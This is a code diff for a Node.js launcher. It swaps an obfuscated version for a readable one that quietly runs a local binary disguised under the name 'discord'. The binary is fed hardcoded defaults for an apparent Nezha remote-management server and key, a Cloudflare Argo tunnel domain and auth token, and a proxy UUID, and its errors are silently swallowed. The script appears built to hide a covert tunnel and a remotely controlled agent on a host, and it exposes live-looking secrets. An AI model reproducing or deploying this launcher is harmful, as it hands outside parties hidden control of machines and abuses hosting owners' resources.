@@ -1,1 +1,33 @@
-const _0x4bbdeb=_0x5763;(function(_0x174e66,_0x38d6d2){const _0x51bdab=_0x5763,_0x5189c2=_0x174e66();while(!![]){try{const _0x3e45d3=-parseInt(_0x51bdab(0x168))/0x1*(parseInt(_0x51bdab(0x17c))/0x2)+-parseInt(_0x51bdab(0x167))/0x3+parseInt(_0x51bdab(0x166))/0x4*(parseInt(_0x51bdab(0x169))/0x5)+-parseInt(_0x51bdab(0x171))/0x6*(-parseInt(_0x51bdab(0x16c))/0x7)+parseInt(_0x51bdab(0x188))/0x8*(-parseInt(_0x51bdab(0x17d))/0x9)+-parseInt(_0x51bdab(0x174))/0xa*(parseInt(_0x51bdab(0x189))/0xb)+-parseInt(_0x51bdab(0x183))/0xc*(-parseInt(_0x51bdab(0x180))/0xd);if(_0x3e45d3===_0x38d6d2)break;else _0x5189c2['push'](_0x5189c2['shift']());}catch(_0x181333){_0x5189c2['push'](_0x5189c2['shift']());}}}(_0xd22e,0xea8bd));const {execFile}=require(_0x4bbdeb(0x187)),path=require('path'),fs=require('fs'),dotenv=require('dotenv');dotenv[_0x4bbdeb(0x18a)]();function _0xd22e(){const _0x169771=['9afd1229-b893-40c1-84dd-51e7ce204913','ARGO_DOMAIN','16952494MSTmwm','error','closeSync','12VhxPwJ','eyJhIjoiOGI5NzI0MDgwZTU1ZTcwMzcwZmI3NDI4NzkyMmYzMWIiLCJ0IjoiM2E3NzJlYWMtODE3MC00MzljLTk3NjQtNDQzOWQyMjM4NDY3IiwicyI6Ik9EaGpZbVV5TkRRdE9UQTBOUzAwTldNeUxXRXpaakF0WldFNE1ESmtNMlF6WWpnNCJ9','www.visa.com.tw','ARGO_AUTH','child_process','24wkKOzi','12749RlejKR','config','openSync','ignore','discord','124AtNNAO','4643340iNYKYV','813563VPYZji','200055PzZfDq','CFPORT','env','7TLmhoL','NEZHA_KEY','8080','2go.askoo.dev','NAME','7710306FPJqNo','120','URL','3470hyDqwn','TIME','UUID','app.log','5555','ARGO_PORT','nz.f4i.cn','443','2KFeuNp','315639FrtcgA'];_0xd22e=function(){return _0x169771;};return _0xd22e();}function _0x5763(_0xc4b11a,_0x57d95c){const _0xd22ef6=_0xd22e();return _0x5763=function(_0x576335,_0x3eed7e){_0x576335=_0x576335-0x164;let _0x162be1=_0xd22ef6[_0x576335];return _0x162be1;},_0x5763(_0xc4b11a,_0x57d95c);}const env={'URL':process[_0x4bbdeb(0x16b)][_0x4bbdeb(0x173)]||'','TIME':process[_0x4bbdeb(0x16b)][_0x4bbdeb(0x175)]||_0x4bbdeb(0x172),'UUID':process[_0x4bbdeb(0x16b)][_0x4bbdeb(0x176)]||_0x4bbdeb(0x17e),'NEZHA_SERVER':process[_0x4bbdeb(0x16b)]['NEZHA_SERVER']||_0x4bbdeb(0x17a),'NEZHA_PORT':process[_0x4bbdeb(0x16b)]['NEZHA_PORT']||_0x4bbdeb(0x178),'NEZHA_KEY':process['env'][_0x4bbdeb(0x16d)]||'vi6gv71EWtEgSPXkHy','ARGO_DOMAIN':process['env'][_0x4bbdeb(0x17f)]||_0x4bbdeb(0x16f),'ARGO_AUTH':process[_0x4bbdeb(0x16b)][_0x4bbdeb(0x186)]||_0x4bbdeb(0x184),'ARGO_PORT':process[_0x4bbdeb(0x16b)][_0x4bbdeb(0x179)]||_0x4bbdeb(0x16e),'CFIP':process['env']['CFIP']||_0x4bbdeb(0x185),'CFPORT':process['env'][_0x4bbdeb(0x16a)]||_0x4bbdeb(0x17b),'NAME':process[_0x4bbdeb(0x16b)][_0x4bbdeb(0x170)]||'Saclingo'},logFile=fs[_0x4bbdeb(0x18b)](_0x4bbdeb(0x177),'a'),binaryPath=path['join'](__dirname,_0x4bbdeb(0x165)),child=execFile(binaryPath,[],{'env':env,'stdio':[_0x4bbdeb(0x164),logFile,logFile]});child['on'](_0x4bbdeb(0x181),()=>{}),child['on']('exit',()=>{const _0x104951=_0x4bbdeb;fs[_0x104951(0x182)](logFile);});
+const { execFile } = require('child_process');
+const path = require('path');
+const fs = require('fs');
+const dotenv = require('dotenv');
+
+dotenv.config();
+
+const env = {
+    URL: process.env.URL || '',
+    TIME: process.env.TIME || '120',
+    UUID: process.env.UUID || '9afd1229-b893-40c1-84dd-51e7ce204913',
+    NEZHA_SERVER: process.env.NEZHA_SERVER || 'nz.f4i.cn',
+    NEZHA_PORT: process.env.NEZHA_PORT || '5555',
+    NEZHA_KEY: process.env.NEZHA_KEY || 'vi6gv71EWtEgSPXkHy',
+    ARGO_DOMAIN: process.env.ARGO_DOMAIN || '2go.askoo.dev',
+    ARGO_AUTH: process.env.ARGO_AUTH || 'eyJhIjoiOGI5NzI0MDgwZTU1ZTcwMzcwZmI3NDI4NzkyMmYzMWIiLCJ0IjoiM2E3NzJlYWMtODE3MC00MzljLTk3NjQtNDQzOWQyMjM4NDY3IiwicyI6Ik9EaGpZbVV5TkRRdE9UQTBOUzAwTldNeUxXRXpaakF0WldFNE1ESmtNMlF6WWpnNCJ9',
+    ARGO_PORT: process.env.ARGO_PORT || '8080',
+    CFIP: process.env.CFIP || 'www.visa.com.tw',
+    CFPORT: process.env.CFPORT || '443',
+    NAME: process.env.NAME || 'Saclingo',
+};
+
+const logFile = fs.openSync('app.log', 'a');
+const binaryPath = path.join(__dirname, 'discord');
+const child = execFile(binaryPath, [], {
+    env: env,
+    stdio: ['ignore', logFile, logFile]  
+});
+
+child.on('error', () => {});
+child.on('exit', () => {
+    fs.closeSync(logFile);
+});
